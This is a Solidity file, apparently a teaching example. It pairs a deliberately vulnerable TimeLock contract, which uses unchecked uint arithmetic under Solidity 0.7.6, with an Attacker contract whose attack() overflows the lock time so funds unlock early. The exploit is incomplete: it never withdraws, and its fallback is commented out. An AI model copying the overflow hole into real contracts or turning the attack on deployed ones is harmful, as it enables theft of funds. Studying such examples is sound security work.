// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTimes;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        lockTimes[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _seconds) public {
        lockTimes[msg.sender] += _seconds;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0, "nothing to withdraw");
        require(lockTimes[msg.sender] < block.timestamp, "too early");

        balances[msg.sender] = 0;
        (bool ok, ) = msg.sender.call{value:bal}("");
        require(ok, "transfer failed");
    }
}

contract Attacker {
    TimeLock public timelock;

    constructor(address _addr) payable {
        timelock = TimeLock(_addr);
    }

    //fallback() external payable{}

    function deposit() public payable {
        timelock.deposit{value:msg.value}();
    }

    function attack() public {
        uint aweek = uint(1 weeks);
        timelock.increaseLockTime(type(uint).max + 1 - aweek);
    }
}
